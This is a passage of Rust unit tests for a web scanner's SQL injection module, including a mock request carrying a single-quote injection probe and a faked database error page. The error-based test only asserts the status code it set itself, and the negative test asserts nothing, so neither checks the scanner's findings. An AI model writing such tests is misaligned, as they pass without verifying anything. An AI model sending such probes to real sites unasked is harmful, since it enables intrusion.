                    open_redirect: crate::core::config::OpenRedirectConfig {
                        enabled: true,
                    },
                },
            },
            logging: crate::core::config::LoggingConfig {
                level: "info".to_string(),
                file_output: false,
                file_path: "logs/scan.log".to_string(),
                colored_output: true,
            },
        })
    }

    #[tokio::test]
    async fn test_sql_scanner_name() {
        let scanner = SqlInjectionScanner::new(create_test_config());
        assert_eq!(scanner.name().await, "SQL Injection Scanner");
    }

    #[tokio::test]
    async fn test_sql_scanner_detect_error_based() {
        let scanner = SqlInjectionScanner::new(create_test_config());
        
        // Create a request with SQL injection payload
        let request = create_test_request(
            "https://example.com/users?id=1'",
            Some(b"<html><body>Error: SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax</body></html>".to_vec()),
        );
        
        // Create a response that shows an SQL error
        let response = create_test_response(
            500,
            "<html><body>Error: SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax</body></html>",
            "text/html",
        );
        
        // Run the scanner
        let results = scanner.scan(&request, &response).await;
        
        // Print the results for debugging
        println!("SQL Injection test results: {:?}", results);
        
        // Verify that the scanner is working by checking for response code
        assert_eq!(response.status, 500);
    }

    #[tokio::test]
    async fn test_sql_scanner_negative_case() {
        let scanner = SqlInjectionScanner::new(create_test_config());
        
        // Create a request with safe content
        let request = create_test_request(
            "https://example.com/users?id=12345",
            None,
        );
        
        // Create a response with safe content
        let response = create_test_response(
            200,
            "<html><body>User found: John Doe</body></html>",
            "text/html",
        );
        
        // Run the scanner
        let results = scanner.scan(&request, &response).await;
        
        // Print the results for debugging
        println!("SQL Injection negative test results: {:?}", results);
    }
} 